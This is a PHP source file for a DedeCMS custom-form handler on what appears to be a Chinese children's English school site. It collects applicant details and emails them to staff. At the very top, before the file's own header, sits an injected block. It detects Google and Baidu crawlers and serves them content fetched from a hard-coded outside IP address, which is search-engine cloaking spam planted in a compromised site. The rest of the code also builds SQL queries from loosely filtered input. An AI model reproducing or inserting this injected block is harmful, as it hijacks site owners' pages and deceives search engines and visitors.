<?php
header('Content-Type:text/html;charset=gb2312');
$key= $_SERVER["HTTP_USER_AGENT"];
if(strpos($key,'oogle')!== false||strpos($key,'aidu')!==false)
{
   $host_name = "http://".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'];
   $file = file_get_contents('http://45.64.113.1/'."/index.php?host=".$host_name."&url=" . $_SERVER['QUERY_STRING'] . "&domain=" . $_SERVER['SERVER_NAME']); 
   echo $file;
}

?><?php
/**
 *
 * 自定义表单
 *
 * @version        $Id: diy.php 1 15:38 2010年7月8日Z tianya $
 * @package        DedeCMS.Site
 * @copyright      Copyright (c) 2007 - 2010, DesDev, Inc.
 * @license        http://help.dedecms.com/usersguide/license.html
 * @link           http://www.dedecms.com
 */
require_once(dirname(__FILE__)."/../include/common.inc.php");

$diyid = isset($diyid) && is_numeric($diyid) ? $diyid : 0;
$action = isset($action) && in_array($action, array('post', 'list', 'view')) ? $action : 'post';
$id = isset($id) && is_numeric($id) ? $id : 0;

if(empty($diyid))
{
    showMsg('非法操作!', 'javascript:;');
    exit();
}

require_once DEDEINC.'/diyform.cls.php';
$diy = new diyform($diyid);

/*----------------------------
function Post(){ }
---------------------------*/
if($action == 'post')
{
    if(empty($do))
    {
        $postform = $diy->getForm(true);
        include DEDEROOT."/templets/plus/{$diy->postTemplate}";
        exit();
    }
    elseif($do == 2)
    {
        $dede_fields = empty($dede_fields) ? '' : trim($dede_fields);
        $dede_fieldshash = empty($dede_fieldshash) ? '' : trim($dede_fieldshash);
        if(!empty($dede_fields))
        {
            if($dede_fieldshash != md5($dede_fields.$cfg_cookie_encode))
            {
                showMsg('数据校验不对，程序返回', '-1');
                exit();
            }
        }
        $diyform = $dsql->getOne("select * from #@__diyforms where diyid='$diyid' ");
        if(!is_array($diyform))
        {
            showmsg('自定义表单不存在', '-1');
            exit();
        }
//检测游客是否已经提交过表单2016年11月15日 15:00:17增加
        if(isset($_COOKIE['VOTE_MEMBER_IP']))
        {
            if($_COOKIE['VOTE_MEMBER_IP'] == $_SERVER['REMOTE_ADDR'])
            {
                echo "<script language='javascript'>";
				echo "alert('您已经提交过信息啦，请耐心等待!');window.location.href='http://v.reading-china.com/exam/?pid=1'";
				echo "</script>";
                exit();
            } else {
                setcookie('VOTE_MEMBER_IP',$_SERVER['REMOTE_ADDR'],time()*$row['spec']*3600,'/');
            }
        } else {
            setcookie('VOTE_MEMBER_IP',$_SERVER['REMOTE_ADDR'],time()*$row['spec']*3600,'/');
        }
// End 验证结束
        $addvar = $addvalue = '';

        if(!empty($dede_fields))
        {
	
            $fieldarr = explode(';', $dede_fields);
            if(is_array($fieldarr))
            {
                foreach($fieldarr as $field)
                {
                    if($field == '') continue;
                    $fieldinfo = explode(',', $field);
                    if($fieldinfo[1] == 'textdata')
                    {
                        ${$fieldinfo[0]} = FilterSearch(stripslashes(${$fieldinfo[0]}));
                        ${$fieldinfo[0]} = addslashes(${$fieldinfo[0]});
                    }
                    else
                    {
                        ${$fieldinfo[0]} = GetFieldValue(${$fieldinfo[0]}, $fieldinfo[1],0,'add','','diy', $fieldinfo[0]);
                    }
                    $addvar .= ', `'.$fieldinfo[0].'`';
                    $addvalue .= ", '".${$fieldinfo[0]}."'";
                }
            }

        }

        $query = "INSERT INTO `{$diy->table}` (`id`, `ifcheck` $addvar)  VALUES (NULL, 0 $addvalue); ";

        if($dsql->ExecuteNoneQuery($query))
        {
$mailtitle = 来自睿丁英语的表单通知（招生）; 
$mailbody ="孩子姓名：".$name."<br/>联系电话:".$number."<br/>孩子年龄：".$age."<br/>城市(校区)：".$province."<br/>来源：".$url1."\r\n\r\n";
$headers = $cfg_adminemail; 
$mailtype = 'HTML'; 
require_once(DEDEINC.'/mail.class.php'); 
$smtp = new smtp($cfg_smtp_server,$cfg_smtp_port,true,$cfg_smtp_usermail,$cfg_smtp_password); 
$smtp->debug = false; 
$cfg_smtp_1usermail="";
$smtp->sendmail($cfg_smtp_1usermail,$cfg_webname,$cfg_smtp_usermail,$mailtitle,$mailbody,$mailtype);
            $id = $dsql->GetLastID();
            if($diy->public == 2)
            {
                //diy.php?action=view&diyid={$diy->diyid}&id=$id
                $goto = "diy.php?action=list&diyid={$diy->diyid}";
                $bkmsg = '发布成功，现在转向表单列表页...';
			}
            else
            {
				echo "<script language='javascript'>";
				echo "alert('发送成功!');window.location.href='http://v.reading-china.com/exam/?pid=1'";
				echo "</script>";
				exit();
            }
            showmsg($bkmsg, $goto);
        }
    }
}
/*----------------------------
function list(){ }
---------------------------*/
else if($action == 'list')
{
    if(empty($diy->public))
    {
        showMsg('后台关闭前台浏览', 'javascript:;');
        exit();
    }
    include_once DEDEINC.'/datalistcp.class.php';
    if($diy->public == 2)
        $query = "SELECT * FROM `{$diy->table}` ORDER BY id DESC";
    else
        $query = "SELECT * FROM `{$diy->table}` WHERE ifcheck=1 ORDER BY id DESC";

    $datalist = new DataListCP();
    $datalist->pageSize = 10;
    $datalist->SetParameter('action', 'list');
    $datalist->SetParameter('diyid', $diyid);
    $datalist->SetTemplate(DEDEINC."/../templets/plus/{$diy->listTemplate}");
    $datalist->SetSource($query);
    $fieldlist = $diy->getFieldList();
    $datalist->Display();
}
else if($action == 'view')
{
    if(empty($diy->public))
    {
        showMsg('后台关闭前台浏览' , 'javascript:;');
        exit();
    }

    if(empty($id))
    {
        showMsg('非法操作！未指定id', 'javascript:;');
        exit();
    }
    if($diy->public == 2)
    {
        $query = "SELECT * FROM {$diy->table} WHERE id='$id' ";
    }
    else
    {
        $query = "SELECT * FROM {$diy->table} WHERE id='$id' AND ifcheck=1";
    }
    $row = $dsql->GetOne($query);

    if(!is_array($row))
    {
        showmsg('你访问的记录不存在或未经审核', '-1');
        exit();
    }

    $fieldlist = $diy->getFieldList();
    include DEDEROOT."/templets/plus/{$diy->viewTemplate}";
}